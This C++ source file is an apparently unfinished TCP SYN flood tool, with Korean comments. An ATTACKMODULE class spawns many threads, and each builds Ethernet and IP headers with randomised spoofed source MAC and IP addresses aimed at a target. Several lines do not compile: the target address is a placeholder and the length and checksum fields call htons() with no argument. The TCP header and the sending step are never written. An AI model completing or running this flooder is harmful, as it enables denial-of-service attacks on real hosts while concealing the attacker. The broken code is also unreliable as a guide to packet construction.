#include "../lib/atkmod.h"

ATTACKMODULE::ATTACKMODULE(std::string tip, int type, int speed, int dur){
    this->tip = tip;
    this->type = type;
    this->speed = speed;
    this->dur = dur;
}

void ATTACKMODULE::attack(){
    pthread_t AttackThreads[THREADS];
    
    for(int i = 0; i < THREADS; i++){
        pthread_create(&AttackThreads[i], NULL, attack_routine, this);
    }
    
    for(int i = 0; i < THREADS; i++){
        pthread_join(AttackThreads[i], NULL);
    }
}

// TODO:make attack_routine function
void* attack_routine(void* arg){


    // TCP SYN ATTACK 작성중...
    ATTACKMODULE* module = (ATTACKMODULE*)arg;


    // get my mac, ip
    // send arp request to get target mac
    
    // packet for TCP SYN ATTACK
    PKT<ETHIPTCP> packet;

    // 시드생성
    libnet_seed_prand(NULL);

    // setting packet

    packet.pkt.eth_hdr.ether_dhost = target mac;
    // random source mac
    packet.pkt.eth_hdr.ether_shost[0] = libnet_get_prand(LIBNET_PR8);
    packet.pkt.eth_hdr.ether_shost[1] = libnet_get_prand(LIBNET_PR8);
    packet.pkt.eth_hdr.ether_shost[2] = libnet_get_prand(LIBNET_PR8);
    packet.pkt.eth_hdr.ether_shost[3] = libnet_get_prand(LIBNET_PR8);
    packet.pkt.eth_hdr.ether_shost[4] = libnet_get_prand(LIBNET_PR8);
    packet.pkt.eth_hdr.ether_shost[5] = libnet_get_prand(LIBNET_PR8);
    packet.pkt.eth_hdr.ether_type = htons(ETHERTYPE_IP);



    packet.pkt.ip_hdr.ip_v = 4 << 4;                           // version
    packet.pkt.ip_hdr.ip_hl = 5;                               // header length
    packet.pkt.ip_hdr.ip_tos = IPTOS_LOWDELAY;                 // 뭔지 모르겠음
    packet.pkt.ip_hdr.ip_len = htons();                        // total length
    packet.pkt.ip_hdr.ip_id = libnet_get_prand(LIBNET_PRu16);  // random ID
    packet.pkt.ip_hdr.ip_off = IP_DF;                          // don't fragment
    packet.pkt.ip_hdr.ip_ttl = libnet_get_prand(LIBNET_PR8);   // random TTL
    packet.pkt.ip_hdr.ip_p = IPPROTO_TCP;                      // protocol = TCP
    packet.pkt.ip_hdr.ip_sum = htons();                        // 체크섬, 모르겠음
    packet.pkt.ip_hdr.ip_src = libnet_get_prand(LIBNET_PRu32);  // random source IP
    packet.pkt.ip_hdr.ip_dst = target ip;

    

    return NULL;
}